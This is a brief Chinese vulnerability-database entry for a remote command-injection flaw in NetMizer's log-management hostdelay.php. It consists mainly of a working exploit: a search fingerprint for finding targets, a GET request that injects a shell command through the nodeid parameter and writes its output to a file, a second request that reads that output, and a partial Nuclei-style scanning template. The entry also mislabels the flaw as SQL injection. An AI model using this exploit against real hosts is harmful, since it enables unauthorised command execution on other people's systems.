# NetMizer日志审计hostdelay.php存在命令注入漏洞

- **系统**：NetMizer　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=”NetMizer”`
- **请求**：`GET /data/hostdelay/hostdelay.php?action=list&nodeid=;id>131.txt; HTTP/1.1`
- **关键头**：`id: netmizer-rzsj-hostdelay-rce`　`name: NetMizer RZSJ hostdelay.php 远程命令执行漏洞`　`author: unknow`　`severity: high`

**请求体 / payload**
```
1. 写入131.txt
Host:
2. 访问得到结果
GET /data/hostdelay/131.txt HTTP/1.1
Host:
Cookie: localecookie=a%3A3%3A%7Bs%3A12%3A%22DEFAULT_LANG%22%3Bs%3A11%3A%22zh_CN.UTF-8%22%3Bs%3A12%3A%22FIELD_PREFIX%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22PACKAGE%22%3Bs%3A3%3A%22oma%22%3B%7D; PHPSESSID=250f96a3997ead2efeea9d7af462ea51
NetMizer 日志管理系统存在远程命令执行漏洞，攻击者可通过构造恶意参数执行系统命令并读取回显。
tags: netmizer,rce
metadata:
fofa-query: title="NetMizer 日志管理系统"
verified: true
max-request: 2
http:
- raw:
-
Host: {{Hostname}}
-
GET /data/hostdelay/131.txt HTTP/1.1
Host: {{Hostname}}
Cookie: localecookie=a%3A3%3A%7Bs%3A12%3A%22DEFAULT_LANG%22%…（脚本共 846 字，完整版见原文）
```
- **预期**：200　|　groups=